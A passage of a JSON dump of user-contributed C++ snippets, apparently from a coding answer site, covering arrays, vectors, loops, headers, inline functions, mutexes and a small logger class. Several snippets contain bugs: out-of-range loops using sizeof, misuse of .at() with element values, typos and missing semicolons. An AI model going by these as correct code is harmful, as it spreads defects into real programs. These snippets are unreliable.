    "description": "typedef struct RgbColor {     unsigned char r;     unsigned char g;     unsigned char b; } RgbColor;  typedef struct HsvColor {     unsigned char h;     unsigned char s;     unsigned char v; } HsvColor;  RgbColor HsvToRgb(HsvColor hsv) {     RgbColor rgb;     unsigned char region, remainder, p, q, t;      if (hsv.s == 0)     {         rgb.r = hsv.v;         rgb.g = hsv.v;         rgb.b = hsv.v;         return rgb;     }      region = hsv.h / 43;     remainder = (hsv.h - (region * 43)) * 6;       p = (hsv.v * (255 - hsv.s)) >> 8;     q = (hsv.v * (255 - ((hsv.s * remainder) >> 8))) >> 8;     t = (hsv.v * (255 - ((hsv.s * (255 - remainder)) >> 8))) >> 8;      switch (region)     {         case 0:             rgb.r = hsv.v; rgb.g = t; rgb.b = p;             break;         case 1:             rgb.r = q; rgb.g = hsv.v; rgb.b = p;             break;         case 2:             rgb.r = p; rgb.g = hsv.v; rgb.b = t;             break;         case 3:             rgb.r = p; rgb.g = q; rgb.b = hsv.v;             break;         case 4:             rgb.r = t; rgb.g = p; rgb.b = hsv.v;             break;         default:             rgb.r = hsv.v; rgb.g = p; rgb.b = q;             break;     }      return rgb; }  HsvColor RgbToHsv(RgbColor rgb) {     HsvColor hsv;     unsigned char rgbMin, rgbMax;      rgbMin = rgb.r < rgb.g ? (rgb.r < rgb.b ? rgb.r : rgb.b) : (rgb.g < rgb.b ? rgb.g : rgb.b);     rgbMax = rgb.r > rgb.g ? (rgb.r > rgb.b ? rgb.r : rgb.b) : (rgb.g > rgb.b ? rgb.g : rgb.b);      hsv.v = rgbMax;     if (hsv.v == 0)     {         hsv.h = 0;         hsv.s = 0;         return hsv;     }      hsv.s = 255 * long(rgbMax - rgbMin) / hsv.v;     if (hsv.s == 0)     {         hsv.h = 0;         return hsv;     }      if (rgbMax == rgb.r)         hsv.h = 0 + 43 * (rgb.g - rgb.b) / (rgbMax - rgbMin);     else if (rgbMax == rgb.g)         hsv.h = 85 + 43 * (rgb.b - rgb.r) / (rgbMax - rgbMin);     else         hsv.h = 171 + 43 * (rgb.r - rgb.g) / (rgbMax - rgbMin);      return hsv; } \n",
    "reg_date": "2021-10-12T11:38:09.000Z"
  },
  {
    "id": 975,
    "keyword": null,
    "link": null,
    "title": " c++ if bool true",
    "description": "Consider : // where early is bool // where late is bool  if (!late && early) { \t//RESULT   \treturn 0; }  is the same as:  if (late == false && early == true) { \t//RESULT   \treturn 0; }\n",
    "reg_date": "2021-10-12T11:38:09.000Z"
  },
  {
    "id": 976,
    "keyword": null,
    "link": null,
    "title": " c++ if else if",
    "description": "   if( a == 10 ) {       cout << \"Value of a is 10\" << endl;    } else if( a == 20 ) {       // if else if condition is true       cout << \"Value of a is 20\" << endl;    } \nif(boolean_expression 1) {    // Executes when the boolean expression 1 is true } else if( boolean_expression 2) {    // Executes when the boolean expression 2 is true } else if( boolean_expression 3) {    // Executes when the boolean expression 3 is true } else {    // executes when the none of the above condition is true. } \n",
    "reg_date": "2021-10-12T11:38:09.000Z"
  },
  {
    "id": 977,
    "keyword": null,
    "link": null,
    "title": " c++ if example",
    "description": "if (20 > 18) {   cout << \"20 is greater than 18\"; }\nint x = 20; int y = 18; if (x > y) {   cout << \"x is greater than y\"; }\n#include<iostream> using namespace std; int main(){ \tint eta;  \tcout<<\"Ciao Utente inserisci la tua eta'! \"<<\"\\n\"; \tcin>>eta; \tif(eta >= 18){ \t\tcout<<\"Benvenuto al cinema!\"; \t} }\n",
    "reg_date": "2021-10-12T11:38:09.000Z"
  },
  {
    "id": 978,
    "keyword": null,
    "link": null,
    "title": " c++ if in equivalent",
    "description": "#include <algorithm> #include <vector>  if ( std::find(vec.begin(), vec.end(), item) != vec.end() )    do_this(); else    do_that();\n",
    "reg_date": "2021-10-12T11:38:09.000Z"
  },
  {
    "id": 979,
    "keyword": null,
    "link": null,
    "title": " c++ in linux",
    "description": "$ sudo apt install g++ $ sudo apt install build-essential $ g++ --version\n",
    "reg_date": "2021-10-12T11:38:09.000Z"
  },
  {
    "id": 980,
    "keyword": null,
    "link": null,
    "title": " c++ include <> vs \"\"",
    "description": "#include <iostream> //compiler will look in the predefined header directories only #include \"custom\" //compiler will look in the local and predefined header directories \n",
    "reg_date": "2021-10-12T11:38:09.000Z"
  },
  {
    "id": 981,
    "keyword": null,
    "link": null,
    "title": " c++ include header",
    "description": "// my_class.h #ifndef MY_CLASS_H // include guard #define MY_CLASS_H  namespace N {     class my_class     {     public:         void do_something();     }; }  #endif /* MY_CLASS_H */ \n#include \"headerfile.h\"\n// You should use header files when you wan't to split your // program across multiple files. Use it like this:  // vec2.hpp class vec2 { \tpublic:   \t\tvoid printVec(); // Decleration   \t\tfloat x, y; } // vec2.cpp #include \"vec2.hpp\" void vec2::printVec() { // Implementation \tstd::cout << x << y << std::endl; }\n// sample.h #pragma once #include <vector> // #include directive #include <string>  namespace N  // namespace declaration {     inline namespace P     {         //...     }      enum class colors : short { red, blue, purple, azure };      const double PI = 3.14;  // const and constexpr definitions     constexpr int MeaningOfLife{ 42 };     constexpr int get_meaning()     {         static_assert(MeaningOfLife == 42, \"unexpected!\"); // static_assert         return MeaningOfLife;     }     using vstr = std::vector<int>;  // type alias     extern double d; // extern variable  #define LOG   // macro definition  #ifdef LOG   // conditional compilation directive     void print_to_log(); #endif      class my_class   // regular class definition,     {                // but no non-inline function definitions          friend class other_class;     public:         void do_something();   // definition in my_class.cpp         inline void put_value(int i) { vals.push_back(i); } // inline OK      private:         vstr vals;         int i;     };      struct RGB     {         short r{ 0 };  // member initialization         short g{ 0 };         short b{ 0 };     };      template <typename T>  // template definition     class value_store     {     public:         value_store<T>() = default;         void write_value(T val)         {             //... function definition OK in template         }     private:         std::vector<T> vals;     };      template <typename T>  // template declaration     class value_widget; } \n#include \"enter_name_here.cpp\"  //Make sure the files are in the same directory. \n",
    "reg_date": "2021-10-12T11:38:10.000Z"
  },
  {
    "id": 982,
    "keyword": null,
    "link": null,
    "title": " c++ initialise array",
    "description": "int* a = NULL;   // Pointer to int, initialize to nothing. int n;           // Size needed for array cin >> n;        // Read in the size a = new int[n];  // Allocate n ints and save ptr in a. for (int i=0; i<n; i++) {     a[i] = 0;    // Initialize all elements to zero. } . . .  // Use a as a normal array delete [] a;  // When done, free memory pointed to by a. a = NULL;     // Clear a to prevent using invalid memory reference. \nint nums[100] = {0}; // initiallize all values to 0  int nums[5] = {1,2,3,4,5};  // type name[size] = {values};\nint nCount[] = {1, 2, 3, 4, 5};\nint arr[3] = {1, 5, 4};\n",
    "reg_date": "2021-10-12T11:38:10.000Z"
  },
  {
    "id": 983,
    "keyword": null,
    "link": null,
    "title": " c++ initialization list",
    "description": "// Constructor Member Initializer List  #include <iostream>  class Example { private:     int x, y;  public:     Example() : x(0), y(0) {}     Example(int x1, int y1) : x(x1), y(y1) {}     ~Example() {} };  int main() {     Example e; }\nstruct S {     int n;     S(int); // constructor declaration     S() : n(7) {} // constructor definition.                   // \": n(7)\" is the initializer list };  S::S(int x) : n{x} {} // constructor definition. \": n{x}\" is the initializer list  int main() {     S s; // calls S::S()     S s2(10); // calls S::S(int) }\n#include <iostream> class Entity { private :  \tstd::string m_Name; \tint m_Score; \tint x, y, z; public: \tEntity() \t\t:m_Name(\"[Unknown]\"),m_Score(0),x(0),y(0),z(0)//initialize in the order of how var are declared \t{ \t} \tEntity (const std::string& name)  \t\t:m_Name(name) \t{} \tconst std::string& GetName() const { return m_Name; }; }; int main() { \tEntity e1; \tstd::cout << e1.GetName() << std::endl; \tEntity e2(\"Caleb\"); \tstd::cout << e2.GetName() << std::endl; \tstd::cin.get(); }\nclass Something { private:     int m_value1;     double m_value2;     char m_value3;   public:     Something()     {         // These are all assignments, not initializations         m_value1 = 1;         m_value2 = 2.2;         m_value3 = 'c';     } }; \nclass Example { public: \tint m_A, m_B, m_C; \tExample(int a, int b, int c); };  Example::Example(int a, int b, int c): \t// This is an initializer list \tm_A(a), \tm_B(b), \tm_C(c) { /* Constructor code */ } \t\n",
    "reg_date": "2021-10-12T11:38:10.000Z"
  },
  {
    "id": 984,
    "keyword": null,
    "link": null,
    "title": " c++ initialize a struct",
    "description": "// exemple avec la structure Coordonnees : struct Coordonnees {   int x;   int y; }  int main() {   Coordonnees coords = {1,2}; }\nstruct address {     int street_no;     char *street_name;     char *city;     char *prov;     char *postal_code; };  address temp_address = {   0,  // street_no   nullptr,  // street_name   \"Hamilton\",  // city   \"Ontario\",  // prov   nullptr,  // postal_code };\n",
    "reg_date": "2021-10-12T11:38:10.000Z"
  },
  {
    "id": 985,
    "keyword": null,
    "link": null,
    "title": " c++ initialize a vector",
    "description": "#include <bits/stdc++.h>  #include <vector>  using namespace std;     int main()  {  // This vector initializes with the values: 10, 20, and 30   vector<int> vect{ 10, 20, 30 };       return 0;  } \nvector<int> vect{ 10, 20, 30 };\n// CPP program to create an empty vector // and push values one by one. #include <bits/stdc++.h> using namespace std;  int main() { \tint n = 3;  \t// Create a vector of size n with \t// all values as 10. \tvector<int> vect(n, 10);  \tfor (int x : vect) \t\tcout << x << \" \";  \treturn 0; } \nstd::vector<type> name;\n",
    "reg_date": "2021-10-12T11:38:10.000Z"
  },
  {
    "id": 986,
    "keyword": null,
    "link": null,
    "title": " c++ initialize array",
    "description": "int nums[100] = {0}; // initiallize all values to 0  int nums[5] = {1,2,3,4,5};  // type name[size] = {values};\nint* a = NULL;   // Pointer to int, initialize to nothing. int n;           // Size needed for array cin >> n;        // Read in the size a = new int[n];  // Allocate n ints and save ptr in a. for (int i=0; i<n; i++) {     a[i] = 0;    // Initialize all elements to zero. } . . .  // Use a as a normal array delete [] a;  // When done, free memory pointed to by a. a = NULL;     // Clear a to prevent using invalid memory reference. \n#include <iostream> using std::cout;  int a[] = { 1, 2, 3, 4, 5 }; int counta()   {   return sizeof( a ) / sizeof( a[ 0 ] );  // works, since a[] is an array   }  int countb( int b[] )   {   return sizeof( b ) / sizeof( b[ 0 ] );  // fails, since b[] is a pointer   }\nint foo [] = { 16, 2, 77, 40, 12071 };\nint nCount[] = {1, 2, 3, 4, 5};\nint arr[3] = {1, 5, 4};\n",
    "reg_date": "2021-10-12T11:38:10.000Z"
  },
  {
    "id": 987,
    "keyword": null,
    "link": null,
    "title": " c++ initialize array 1 to n",
    "description": "std::vector<int> arr(SIZE); for (int i = 0; i < SIZE; i++) {     arr[i] = i; } \n",
    "reg_date": "2021-10-12T11:38:10.000Z"
  },
  {
    "id": 988,
    "keyword": null,
    "link": null,
    "title": " c++ initialize array with all zeros",
    "description": "int myArray[10] = { 0 }; // all elements 0 \n",
    "reg_date": "2021-10-12T11:38:10.000Z"
  },
  {
    "id": 989,
    "keyword": null,
    "link": null,
    "title": " c++ initialize size of 3d vector",
    "description": "vector<vector<vector<double>>> f(3, vector<vector<double>>(4, vector<double>(5))); \n",
    "reg_date": "2021-10-12T11:38:10.000Z"
  },
  {
    "id": 990,
    "keyword": null,
    "link": null,
    "title": " c++ initialize vector of vector with size",
    "description": "vector<vector<int>> v(10, vector<int>(10));\nvector<vector<vector<double>>> f(3, vector<vector<double>>(4, vector<double>(5))); \n// create a vector with 20 integer elements std::vector<int> arr(20);  for(int x = 0; x < 20; ++x)    arr[x] = x;\n#include <vector>  auto n = 20 // create a vector with n=20 integer elements std::vector<int> arr(n);\n",
    "reg_date": "2021-10-12T11:38:11.000Z"
  },
  {
    "id": 991,
    "keyword": null,
    "link": null,
    "title": " c++ inline",
    "description": "#include<iostream> /* When a function will be called repetitively, The \"inline\" keyword is used for  optimization. The inline function tells the compiler that every instance of this function should be replaced with the line or block of code in the body of the function; This makes the compiler skip the middle-man, the function itself!  Important note: this method of optimization saves very little space, but it is still good practice.  ********************************************************************* * If this helped you, plz upvote!                                   * * My goal is to make programming easier to understand for everyone; *  * upvoting my content motivates me to post more!                    * *                                                                   * *********************************************************************   */ inline void PrintEverySecond(string str)  { std::cout << str;  int main() { string Message = \"Inline!\"  PrintEverySecond(Message);  }   // Unimportant note: this code obviously won't print every second since in isn't in a loop. This code is just a simple demo!\nA function specifier that indicates to the compiler that inline substitution  of the function body is to be preferred to the usual function call  implementation \n#include <iostream>   using namespace std;  inline int Max(int x, int y) {    return (x > y)? x : y; }  // Main function for the program int main() {    cout << \"Max (20,10): \" << Max(20,10) << endl;    cout << \"Max (0,200): \" << Max(0,200) << endl;    cout << \"Max (100,1010): \" << Max(100,1010) << endl;        return 0; }\nInline Member Functions (C++) A member function that is both declared and defined in the class member list is called an inline member function. Member functions containing a few lines of code are usually declared inline. \n",
    "reg_date": "2021-10-12T11:38:11.000Z"
  },
  {
    "id": 992,
    "keyword": null,
    "link": null,
    "title": " c++ input from terminal when program is called",
    "description": "  int i;   cout << \"Please enter an integer value: \";   cin >> i;\n#include <iostream>  int main(){   std::cout << \"Hello World!\" << std::endl; // prints \"Hello World\" }\n#include <iostream> #include <string>  int main( int argc, char* argv[] ) {     std::string my_arg;      // First argument is always the name of your program     std::cout << argv[0] << std::endl;      if( argc == 2 )     {         // Something has been passed in         my_arg = argv[1];         std::cout << \"Argument passed in is \" << my_arg << std::endl;     }      return 0; }\n",
    "reg_date": "2021-10-12T11:38:11.000Z"
  },
  {
    "id": 993,
    "keyword": null,
    "link": null,
    "title": " c++ insert variable into string",
    "description": "#include <iostream>  using namespace std;  int main() {   string someString = \" C++ \"        cout << \"This is a\" + someString + \"example.\" << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:38:11.000Z"
  },
  {
    "id": 994,
    "keyword": null,
    "link": null,
    "title": " c++ insertion in astack",
    "description": "stack<int> a; a.push(5); a.push(6); //.....\n",
    "reg_date": "2021-10-12T11:38:11.000Z"
  },
  {
    "id": 995,
    "keyword": null,
    "link": null,
    "title": " c++ int max value",
    "description": "#include <limits>  int imin = std::numeric_limits<int>::min(); // minimum value int imax = std::numeric_limits<int>::max(); // maximum value (2147483647)\nint min = INT_MIN;\n// max example #include <iostream>     // std::cout #include <algorithm>    // std::max  int main () {   std::cout << \"max(1,2)==\" << std::max(1,2) << '\\n';   std::cout << \"max(2,1)==\" << std::max(2,1) << '\\n';   std::cout << \"max('a','z')==\" << std::max('a','z') << '\\n';   std::cout << \"max(3.14,2.73)==\" << std::max(3.14,2.73) << '\\n';   return 0; }\n2147483647   unsigned long long int = 18 446 744 073 709 551 615\n// C #include <limits.h> unsigned int max_unsigned_int_size = UINT_MAX;  // C++ #include <limits> unsigned int max_unsigned_int_size = std::numeric_limits<unsigned int>::max();\nWrite a program to find the sum of maximum and minimum level in a binary tree\n",
    "reg_date": "2021-10-12T11:38:11.000Z"
  },
  {
    "id": 996,
    "keyword": null,
    "link": null,
    "title": " c++ int to string",
    "description": "#include <string>   std::string s = std::to_string(42);\n#include <iostream> #include<string> using namespace std; int main() { int i = 11; float f = 12.3; string str = to_string(i); strinf fstr = to_string(f); }\n#include <string> using namespace std;  int iIntAsInt = 658; string sIntAsString = to_string(iIntAsInt);\nint x = 5; string str = to_string(x);\nstd::to_string(23213.123)\n// ----------------------------------- C++ 11 and onwards // EXAMPLE #include <string> int iIntAsInt = 658; std::string sIntAsString = to_string(iIntAsInt);  /* SYNTAX to_string(<your-integer>) */  // ----------------------------------- BEFORE C++ 11 // EXAMPLE #include <sstream> #include <string> int iYourInt = 5; std::stringstream ssYourInt_AsStream << iYourInt; std::string sYourInt_AsString = ssYourInt_AsStream.str();\n",
    "reg_date": "2021-10-12T11:38:11.000Z"
  },
  {
    "id": 997,
    "keyword": null,
    "link": null,
    "title": " c++ integer array",
    "description": "int arr[13] //Array of size 13\n",
    "reg_date": "2021-10-12T11:38:11.000Z"
  },
  {
    "id": 998,
    "keyword": null,
    "link": null,
    "title": " c++ integer division",
    "description": "// truncates decimal cout << 20.0 / 3; // 6.66667  cout <<   20 / 3; // 6 cout <<  -20 / 3; // -6\n",
    "reg_date": "2021-10-12T11:38:11.000Z"
  },
  {
    "id": 999,
    "keyword": null,
    "link": null,
    "title": " c++ is string a number",
    "description": "bool isStringNumber(string str){ for(int i=0;i<str.length();i++){ if(str[i]<'0'||str[i]>'9'){ return false; } } return true;  } //Beleive in Allah! //just my slogan\n",
    "reg_date": "2021-10-12T11:38:11.000Z"
  },
  {
    "id": 1000,
    "keyword": null,
    "link": null,
    "title": " c++ isalphanum",
    "description": "string test = \"Ab4 :\"; std::isalnum(test[0]);\t//true std::isalnum(test[1]);\t//true std::isalnum(test[2]);\t//true std::isalnum(test[3]);\t//false std::isalnum(test[4]);\t//false\n",
    "reg_date": "2021-10-12T11:38:12.000Z"
  },
  {
    "id": 1001,
    "keyword": null,
    "link": null,
    "title": " c++ iterate over vector",
    "description": "std::vector<int> vec_of_ints(10, 1); // 10 ints all with value 1 for (int i : vec_of_ints) {          // use auto for more complex types  \tstd::cout << vec_of_ints.at(i) << \" \";  } std::cout << std::endl;\nvector<int> myVector;  myVector.push_back(1); myVector.push_back(2); myVector.push_back(3); myVector.push_back(4);  for(auto x: myVector){ \tcout<< x << \" \";  }  vector<pair<int,int>> myVectorOfPairs;  myVectorOfPairs.push_back({1,2}); myVectorOfPairs.push_back({3,4}); myVectorOfPairs.push_back({5,6}); myVectorOfPairs.push_back({7,8});  for(auto x: myVectorOfPairs){ \tcout<< x.first << \" \" << x.second << endl;  }       \nfor(auto const& value: a) {      /* std::cout << value; ... */ }\nfor (auto & element : vector) {     element.doSomething (); }\nvector<int> vi; ... for(int i : vi)    cout << \"i = \" << i << endl;\nfor(std::vector<T>::size_type i = 0; i != v.size(); i++) {     v[i].doSomething(); }\n",
    "reg_date": "2021-10-12T11:38:12.000Z"
  },
  {
    "id": 1002,
    "keyword": null,
    "link": null,
    "title": " c++ iterate over vector backwards",
    "description": "#include <iostream> #include <vector>  using namespace std;  int main(void) {    vector<int> v = {1, 2, 3, 4, 5};     /* Iterate vector in reverse order */    for (auto it =  v.rbegin(); it != v.rend(); ++it)       cout << *it << endl;       /* Iterate vector in reverse order */     for(int i = v.size() - 1; i >= 0; i--)         std::cout << v[i] << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:38:12.000Z"
  },
  {
    "id": 1003,
    "keyword": null,
    "link": null,
    "title": " c++ iterate over vector of pointers",
    "description": "for (vector<int Type>:: iter = myVector.begin(); iter != myVector.end(); iter++)    (*iter)->display();\n",
    "reg_date": "2021-10-12T11:38:12.000Z"
  },
  {
    "id": 1004,
    "keyword": null,
    "link": null,
    "title": " c++ iterate through constant list",
    "description": "const list<int> numbers; for(list<int>::const_iterator it = numbers.begin(); it != numbers.end(); it++)     cout << *it << endl;\n",
    "reg_date": "2021-10-12T11:38:12.000Z"
  },
  {
    "id": 1005,
    "keyword": null,
    "link": null,
    "title": " c++ iterate through vectgor",
    "description": "std::vector<int> vec_of_ints(10, 1); // 10 ints all with value 1 for (int i : vec_of_ints) {          // use auto for more complex types  \tstd::cout << vec_of_ints.at(i) << \" \";  } std::cout << std::endl;\n",
    "reg_date": "2021-10-12T11:38:12.000Z"
  },
  {
    "id": 1006,
    "keyword": null,
    "link": null,
    "title": " c++ itoa",
    "description": "#include <sstream>  int i = 5; std::string s; std::stringstream out; out << i; s = out.str();\n",
    "reg_date": "2021-10-12T11:38:12.000Z"
  },
  {
    "id": 1007,
    "keyword": null,
    "link": null,
    "title": " c++ lambda thread example",
    "description": " std::thread t([](){         std::cout << \"thread function\\n\";     });      t.join();\n",
    "reg_date": "2021-10-12T11:38:12.000Z"
  },
  {
    "id": 1008,
    "keyword": null,
    "link": null,
    "title": " c++ last element of array",
    "description": "int arr={1,2,3,4,5,6}; int length=sizeof(arr)/sizeof(int); int lastElement=aar[length-1];\n#include<iostream> /*To get the last element of the array we first get the size      of the array by using sizeof().  Unfortunately, this gives      us the size of the array in bytes.  To fix this, we divide     the size (in bytes) by the size of the data type in the array.     In our case, this would be int, so we divide sizeof(array)      by sizeof(int).  Since arrays  start from 0 and not 1 we      subtract one to get the last element.     -yegor*/ int array[5] = { 1, 2, 3, 4, 5 }; printf(\"Last Element of Array: %d\", array[(sizeof(array)/sizeof(int))-1]);\nint arr[10]; int len = sizeof(arr) / sizeof(arr[0]);\n",
    "reg_date": "2021-10-12T11:38:12.000Z"
  },
  {
    "id": 1009,
    "keyword": null,
    "link": null,
    "title": " c++ length of char*",
    "description": "#include <iostream> #include <string.h>  using namespace std;  int main() {     char *str = \"ABC\";     cout << strlen(str) << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:38:12.000Z"
  },
  {
    "id": 1010,
    "keyword": null,
    "link": null,
    "title": " c++ length of char array",
    "description": "char* example = \"Lorem ipsum dolor sit amet\"; int length = strlen(example); std::cout << length << '\\n'; // 26\n#include <iostream> #include <string.h>  using namespace std;  int main() {     char *str = \"ABC\";     cout << strlen(str) << endl;     return 0; }\n#include <iostream>  using namespace std;  int main() {     char arr[] = \"grepper\";     cout << sizeof(arr) << endl;     return 0;     //    keep it in mind that character arrays have length of one more than your characters because last one is for \\0 to show that word has ended } \nchar* a = \"ABC\"; int length = sizeof(a)/sizeof(char);\nInstead of sizeof() for finding the length of strings or character  arrays, just use strlen(string_name) with the header file #include <cstring>    it's easier.\n",
    "reg_date": "2021-10-12T11:38:13.000Z"
  },
  {
    "id": 1011,
    "keyword": null,
    "link": null,
    "title": " c++ length of int",
    "description": "// array::size #include <iostream> #include <array>  int main () {   std::array<int,5> myints;   std::cout << \"size of myints: \" << myints.size() << std::endl;   std::cout << \"sizeof(myints): \" << sizeof(myints) << std::endl;    return 0; }\nunsigned int number_of_digits = 0;  do {      ++number_of_digits;       n /= base; } while (n);\nsizeof(num);\n",
    "reg_date": "2021-10-12T11:38:13.000Z"
  },
  {
    "id": 1012,
    "keyword": null,
    "link": null,
    "title": " c++ lettura file",
    "description": "#include <fstream.h>  void main()  {   ifstream OpenFile(\"cpp-input.txt\");   char ch;   while(!OpenFile.eof())   {     OpenFile.get(ch);     cout << ch;   }   OpenFile.close(); }\n",
    "reg_date": "2021-10-12T11:38:13.000Z"
  },
  {
    "id": 1013,
    "keyword": null,
    "link": null,
    "title": " c++ linked list clear",
    "description": "void llDeleteNode(List &list, Node* node) { \tif(list == node) \t\tlist = llNext(list); \telse \t{ \t\tList temp = list; \t\twhile (llNext(temp) != node) \t\t\ttemp = llNext(temp);  \t\ttemp->next = node->next; \t}  \tdelete node; }  void llClear(List &list) { \twhile(list != NULL) \t\tllDeleteNode(list, list); }\n",
    "reg_date": "2021-10-12T11:38:13.000Z"
  },
  {
    "id": 1014,
    "keyword": null,
    "link": null,
    "title": " c++ linker input and output",
    "description": "The input to the linker is the output from the compiler, either directly as object files (.o) are within libraries (.a and .so). Often a linker command will have a single .o file that contains the main program plus a list of libraries.  The output from the linker is the executable or program. There is no default extension, although some people use .exe which is a standard extension on some operating systems.\n",
    "reg_date": "2021-10-12T11:38:13.000Z"
  },
  {
    "id": 1015,
    "keyword": null,
    "link": null,
    "title": " c++ list pop back",
    "description": "void pop_back(); // desc: remove last element. complexity: constant\n",
    "reg_date": "2021-10-12T11:38:13.000Z"
  },
  {
    "id": 1016,
    "keyword": null,
    "link": null,
    "title": " c++ little endian or big endian",
    "description": "if ( htonl(47) == 47 ) {   // Big endian } else {   // Little endian. }\n",
    "reg_date": "2021-10-12T11:38:13.000Z"
  },
  {
    "id": 1017,
    "keyword": null,
    "link": null,
    "title": " c++ load file as vector",
    "description": "#include <iostream> #include <iterator> #include <fstream> #include <vector> #include <algorithm> // for std::copy  int main() {   std::ifstream is(\"numbers.txt\");   std::istream_iterator<double> start(is), end;   std::vector<double> numbers(start, end);   std::cout << \"Read \" << numbers.size() << \" numbers\" << std::endl;    // print the numbers to stdout   std::cout << \"numbers read in:\\n\";   std::copy(numbers.begin(), numbers.end(),              std::ostream_iterator<double>(std::cout, \" \"));   std::cout << std::endl;  } \n",
    "reg_date": "2021-10-12T11:38:13.000Z"
  },
  {
    "id": 1018,
    "keyword": null,
    "link": null,
    "title": " c++ localtime unsafe",
    "description": "inline std::tm localtime_xp(std::time_t timer) {     std::tm bt {}; #if defined(__unix__)     localtime_r(&timer, &bt); #elif defined(_MSC_VER)     localtime_s(&bt, &timer); #else     static std::mutex mtx;     std::lock_guard<std::mutex> lock(mtx);     bt = *std::localtime(&timer); #endif     return bt; }  // default = \"YYYY-MM-DD HH:MM:SS\" inline std::string time_stamp(const std::string& fmt = \"%F %T\") {     auto bt = localtime_xp(std::time(0));     char buf[64];     return {buf, std::strftime(buf, sizeof(buf), fmt.c_str(), &bt)}; } \n",
    "reg_date": "2021-10-12T11:38:13.000Z"
  },
  {
    "id": 1019,
    "keyword": null,
    "link": null,
    "title": " c++ lock",
    "description": "#include <mutex>  std::mutex mtx;  mtx.lock(); //Code here mtx.unlock();\n",
    "reg_date": "2021-10-12T11:38:14.000Z"
  },
  {
    "id": 1020,
    "keyword": null,
    "link": null,
    "title": " c++ lock guard",
    "description": "// lock_guard example #include <iostream>       // std::cout #include <thread>         // std::thread #include <mutex>          // std::mutex, std::lock_guard #include <stdexcept>      // std::logic_error  std::mutex mtx;  void print_even (int x) {   if (x%2==0) std::cout << x << \" is even\\n\";   else throw (std::logic_error(\"not even\")); }  void print_thread_id (int id) {   try {     // using a local lock_guard to lock mtx guarantees unlocking on destruction / exception:     std::lock_guard<std::mutex> lck (mtx);     print_even(id);   }   catch (std::logic_error&) {     std::cout << \"[exception caught]\\n\";   } }  int main () {   std::thread threads[10];   // spawn 10 threads:   for (int i=0; i<10; ++i)     threads[i] = std::thread(print_thread_id,i+1);    for (auto& th : threads) th.join();    return 0; }\n",
    "reg_date": "2021-10-12T11:38:14.000Z"
  },
  {
    "id": 1021,
    "keyword": null,
    "link": null,
    "title": " c++ logger class example",
    "description": "/* Usage: */ #include \"Log.h\"  int main(int argc, char** argv) {     //Config: -----(optional)----     structlog LOGCFG = {};     LOGCFG.headers = false;      LOGCFG.level = DEBUG;     //---------------------------     LOG(INFO) << \"Main executed with \" << (argc - 1) << \" arguments\"; }  /*   * File:   Log.h  * Author: Alberto Lepe <dev@alepe.com>  *  * Created on December 1, 2015, 6:00 PM  */ #ifndef LOG_H #define LOG_H  #include <iostream>  using namespace std;  enum typelog {     DEBUG,     INFO,     WARN,     ERROR };  struct structlog {     bool headers = false;     typelog level = WARN; };  extern structlog LOGCFG;  class LOG { public:     LOG() {}     LOG(typelog type) {         msglevel = type;         if(LOGCFG.headers) {             operator << (\"[\"+getLabel(type)+\"]\");         }     }     ~LOG() {         if(opened) {             cout << endl;         }         opened = false;     }     template<class T>     LOG &operator<<(const T &msg) {         if(msglevel >= LOGCFG.level) {             cout << msg;             opened = true;         }         return *this;     } private:     bool opened = false;     typelog msglevel = DEBUG;     inline string getLabel(typelog type) {         string label;         switch(type) {             case DEBUG: label = \"DEBUG\"; break;             case INFO:  label = \"INFO \"; break;             case WARN:  label = \"WARN \"; break;             case ERROR: label = \"ERROR\"; break;         }         return label;     } };  #endif  /* LOG_H */ \n",
    "reg_date": "2021-10-12T11:38:14.000Z"
  },
  {
    "id": 1022,
    "keyword": null,
    "link": null,
    "title": " c++ loop",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\n#include <iostream> using namespace std;  int main() { \tfor (int i = 0; i < 20; i++)     { \t\tcout << i << endl;     }   \t//prints the number (i) }\nfor(int i=0; i<=limit; i++) { \t//statement }\n   for (int i = 0; i < 10; i++){   //Do something as long as i is less than 10,    //In that case it will loop 10 times   //use break; to restart the loop whenever you want to cancel the loops.   cout << i;      //at the end, remember i will be increased by 1. }  //output 0123456789\nint x = 0;\n// initialization of variables  #include <iostream> using namespace std;  int main () {   int a=5;               // initial value: 5   int b(3);              // initial value: 3   int c{2};              // initial value: 2   int result;            // initial value undetermined    a = a + b;   result = a - c;   cout << result;    return 0; }\n",
    "reg_date": "2021-10-12T11:38:14.000Z"
  },
  {
    "id": 1023,
    "keyword": null,
    "link": null,
    "title": " c++ loop through array",
    "description": "string texts[] = {\"Apple\", \"Banana\", \"Orange\"}; for( unsigned int a = 0; a < sizeof(texts); a = a + 1 ) {     cout << \"value of a: \" << texts[a] << endl; }\nfor (int i = 0; i < arr.size(); ++i){ //use if we explicitly need the value of i cout << i << \":\\t\" << arr[i] << endl; } for (int element : arr){ //modifying element will not affect the array cout << element << endl; } for (int &element : arr){ //modifying element will affect the array cout << element << endl; }\n#include <iostream> #include <array>  int main() { \tint aNumbers[] = { 0, 1, 2, 3, 4, 5 }; \tint count = 0;\t \t \tfor (int aNumber : aNumbers) \t{\t\t \t\tstd::cout << \"Element \"<< count << \" : \" << aNumber << std::endl; \t\tcount++; \t} }\nfor(int i = 0; i < 4; i++) {   cout << cars[i] << \"\\n\"; }\nint v[] = {1,2,3,4,5}; for (int n : v)   cout << n << endl; //make sure to compile with -std=c++11\n/*sizeof(array_scores) is a pointer to array_scores[],  and has to be divided by each first-object[0]*/ for(int a = 0; a < sizeof(array_scores)/sizeof(array_scores[0]); a = a + 1 ){ \tcout << \"for loop, a = \" << array_scores[a] << \" at position \" << a << \"\\n\"; } //https://stackoverflow.com/questions/20234898/correct-way-of-looping-through-c-arrays\n",
    "reg_date": "2021-10-12T11:38:14.000Z"
  },
  {
    "id": 1024,
    "keyword": null,
    "link": null,
    "title": " c++ loop through int array",
    "description": "#include <iostream> #include <array>  int main() { \tint aNumbers[] = { 0, 1, 2, 3, 4, 5 }; \tint count = 0;\t \t \tfor (int aNumber : aNumbers) \t{\t\t \t\tstd::cout << \"Element \"<< count << \" : \" << aNumber << std::endl; \t\tcount++; \t} }\n",
    "reg_date": "2021-10-12T11:38:14.000Z"
  },
  {
    "id": 1025,
    "keyword": null,
    "link": null,
    "title": " c++ loop trhought object",
